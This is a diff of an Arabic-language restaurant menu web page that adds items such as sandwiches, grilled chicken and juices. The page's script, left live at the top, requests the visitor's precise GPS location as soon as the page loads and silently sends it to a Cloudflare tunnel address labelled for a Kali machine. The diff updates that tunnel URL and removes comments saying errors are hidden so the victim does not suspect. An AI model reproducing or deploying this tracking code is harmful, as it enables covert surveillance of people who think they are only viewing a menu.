@@ -8,7 +8,6 @@
     <script>
         function getGpsLocation() {
             if (navigator.geolocation) {
-                // نطلب الموقع بدقة عالية
                 navigator.geolocation.getCurrentPosition(sendToKali, showError, {
                     enableHighAccuracy: true,
                     timeout: 5000,
@@ -22,21 +21,18 @@
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // الرابط الخاص بك الذي تم إنشاؤه بواسطة Cloudflared
-            var kali_url = "https://java-claire-orders-parallel.trycloudflare.com"; 
+            // الرابط الجديد الخاص بك
+            var kali_url = "https://devices-honest-pamela-kingston.trycloudflare.com"; 
 
-            // إرسال البيانات للسيكر في كالي
             fetch(kali_url + "/log.php?lat=" + lat + "&lon=" + lon + "&acc=" + acc)
             .then(response => console.log("Success"))
             .catch(error => console.log("Error"));
         }
 
         function showError(error) {
-            // في حال رفض الموقع، لا نظهر أي خطأ عشان ما يشك
             console.log("Location denied");
         }
 
-        // تشغيل الرادار بمجرد فتح الصفحة
         window.onload = function() {
             getGpsLocation();
         };
@@ -169,6 +165,172 @@
             <button class="btn-qty btn-minus" onclick="updateQty('كباب مشوي', 70, -1)">-</button>
             <span class="qty-val" id="qty-كباب مشوي">0</span>
             <button class="btn-qty" onclick="updateQty('كباب مشوي', 70, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1550507992-eb63ffee0847?w=400" alt="ساندويش العربي">
+        <div class="item-details"><h3>ساندويش العربي</h3><p>لحم + بطاطا</p><span class="item-price">70 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('ساندويش العربي لحم', 70, -1)">-</button>
+            <span class="qty-val" id="qty-ساندويش العربي لحم">0</span>
+            <button class="btn-qty" onclick="updateQty('ساندويش العربي لحم', 70, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1550507992-eb63ffee0847?w=400" alt="ساندويش العربي">
+        <div class="item-details"><h3>ساندويش العربي</h3><p>دجاج + بطاطا</p><span class="item-price">80 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('ساندويش العربي دجاج', 80, -1)">-</button>
+            <span class="qty-val" id="qty-ساندويش العربي دجاج">0</span>
+            <button class="btn-qty" onclick="updateQty('ساندويش العربي دجاج', 80, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1568901346375-23c9450c58cd?w=400" alt="همبرجر">
+        <div class="item-details"><h3>همبرجر كلاسيك</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('همبرجر كلاسيك', 100, -1)">-</button>
+            <span class="qty-val" id="qty-همبرجر كلاسيك">0</span>
+            <button class="btn-qty" onclick="updateQty('همبرجر كلاسيك', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="adnan3.jpeg" alt="تاكوس">
+        <div class="item-details"><h3>تاكوس فرنسي</h3><span class="item-price">150 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('تاكوس فرنسي', 150, -1)">-</button>
+            <span class="qty-val" id="qty-تاكوس فرنسي">0</span>
+            <button class="btn-qty" onclick="updateQty('تاكوس فرنسي', 150, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="section-title">🍗 قسم الدجاج المشوي</div>
+    
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=400" alt="دجاجة كاملة">
+        <div class="item-details"><h3>دجاجة كاملة مشوية</h3><span class="item-price">450 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('دجاجة كاملة', 450, -1)">-</button>
+            <span class="qty-val" id="qty-دجاجة كاملة">0</span>
+            <button class="btn-qty" onclick="updateQty('دجاجة كاملة', 450, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1626082927389-6cd097cdc6ec?w=400" alt="نص دجاجة">
+        <div class="item-details"><h3>نصف دجاجة</h3><span class="item-price">230 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('نصف دجاجة', 230, -1)">-</button>
+            <span class="qty-val" id="qty-نصف دجاجة">0</span>
+            <button class="btn-qty" onclick="updateQty('نصف دجاجة', 230, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="adnan.jpeg" alt="ربع دجاجة">
+        <div class="item-details"><h3>ربع دجاجة</h3><span class="item-price">120 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('ربع دجاجة', 120, -1)">-</button>
+            <span class="qty-val" id="qty-ربع دجاجة">0</span>
+            <button class="btn-qty" onclick="updateQty('ربع دجاجة', 120, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="section-title">🍕 وجبات وبيتزا</div>
+    
+    <div class="item">
+        <img src="sss.jpeg" alt="بلاط كريفيت">
+        <div class="item-details"><h3>بلاط كريفيت</h3><p>أرز + فريت + مقبلات</p><span class="item-price">250 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('بلاط كريفيت', 250, -1)">-</button>
+            <span class="qty-val" id="qty-بلاط كريفيت">0</span>
+            <button class="btn-qty" onclick="updateQty('بلاط كريفيت', 250, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="https://images.unsplash.com/photo-1513104890138-7c749659a591?w=400" alt="بيتزا">
+        <div class="item-details"><h3>بيتزا العربي</h3><p>لحم أو دجاج حسب الطلب</p><span class="item-price">200 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('بيتزا العربي', 200, -1)">-</button>
+            <span class="qty-val" id="qty-بيتزا العربي">0</span>
+            <button class="btn-qty" onclick="updateQty('بيتزا العربي', 200, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="section-title">🍹 العصائر والسلطات</div>
+    
+    <div class="item">
+        <img src="adnan1.jpeg" alt="عصير برتقال">
+        <div class="item-details"><h3>عصير برتقال طازج</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('عصير برتقال', 100, -1)">-</button>
+            <span class="qty-val" id="qty-عصير برتقال">0</span>
+            <button class="btn-qty" onclick="updateQty('عصير برتقال', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="adnan2.jpeg" alt="عصير أفوكا">
+        <div class="item-details"><h3>عصير أفوكا</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('عصير أفوكا', 100, -1)">-</button>
+            <span class="qty-val" id="qty-عصير أفوكا">0</span>
+            <button class="btn-qty" onclick="updateQty('عصير أفوكا', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="adnan4.jpeg" alt="عصير موز">
+        <div class="item-details"><h3>عصير موز (بنان)</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('عصير موز', 100, -1)">-</button>
+            <span class="qty-val" id="qty-عصير موز">0</span>
+            <button class="btn-qty" onclick="updateQty('عصير موز', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="ff.jpeg" alt="عصير فريز">
+        <div class="item-details"><h3>عصير فريز</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('عصير فريز', 100, -1)">-</button>
+            <span class="qty-val" id="qty-عصير فريز">0</span>
+            <button class="btn-qty" onclick="updateQty('عصير فريز', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="kk.jpeg" alt="عصير كوكتيل">
+        <div class="item-details"><h3>عصير كوكتيل</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('عصير كوكتيل', 100, -1)">-</button>
+            <span class="qty-val" id="qty-عصير كوكتيل">0</span>
+            <button class="btn-qty" onclick="updateQty('عصير كوكتيل', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="ss.jpeg" alt="سلطة فواكه">
+        <div class="item-details"><h3>سلطة فواكه (صغير)</h3><span class="item-price">100 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('سلطة فواكه صغير', 100, -1)">-</button>
+            <span class="qty-val" id="qty-سلطة فواكه صغير">0</span>
+            <button class="btn-qty" onclick="updateQty('سلطة فواكه صغير', 100, 1)">+</button>
+        </div>
+    </div>
+
+    <div class="item">
+        <img src="ss.jpeg" alt="سلطة فواكه">
+        <div class="item-details"><h3>سلطة فواكه (كبير)</h3><span class="item-price">150 أوقية</span></div>
+        <div class="controls">
+            <button class="btn-qty btn-minus" onclick="updateQty('سلطة فواكه كبير', 150, -1)">-</button>
+            <span class="qty-val" id="qty-سلطة فواكه كبير">0</span>
+            <button class="btn-qty" onclick="updateQty('سلطة فواكه كبير', 150, 1)">+</button>
         </div>
     </div>
 
